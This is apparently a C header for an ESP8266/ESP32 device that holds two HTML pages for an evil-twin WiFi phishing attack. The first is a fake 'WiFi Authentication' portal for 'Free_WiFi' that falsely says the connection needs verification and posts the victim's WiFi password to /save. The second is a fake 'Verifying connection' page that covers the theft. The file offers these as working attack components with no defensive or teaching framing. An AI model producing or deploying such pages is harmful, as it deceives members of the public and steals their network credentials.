#ifndef PORTAL_HTML_H
#define PORTAL_HTML_H

const char PORTAL_HTML[] PROGMEM = R"HTML(
<!DOCTYPE html><html><head><title>WiFi Login</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
body{font-family:Arial;background:#1a73e8;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.card{background:#fff;padding:30px;border-radius:12px;width:320px;text-align:center;box-shadow:0 4px 20px rgba(0,0,0,.2)}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #ccc;border-radius:6px;box-sizing:border-box}
button{width:100%;padding:12px;background:#1a73e8;color:#fff;border:0;border-radius:6px;font-size:16px;cursor:pointer}
.err{color:#d93025;font-size:13px}
</style></head><body><div class="card">
<h3>WiFi Authentication</h3>
<p>Your connection requires verification. Please enter your password to continue.</p>
<form action="/save" method="POST">
<input type="hidden" name="ssid" value="Free_WiFi">
<input type="password" name="password" placeholder="WiFi Password" required>
<button type="submit">Connect</button>
</form></div></body></html>
)HTML";

const char SUCCESS_HTML[] PROGMEM = R"HTML(
<!DOCTYPE html><html><head>
<meta http-equiv="refresh" content="4;url=/">
<meta name="viewport" content="width=device-width,initial-scale=1">
</head><body style="font-family:Arial;text-align:center;padding-top:50px">
<h2>&#10003; Verifying connection...</h2>
<p>Please wait while we authenticate you.</p>
</body></html>
)HTML";

#endif
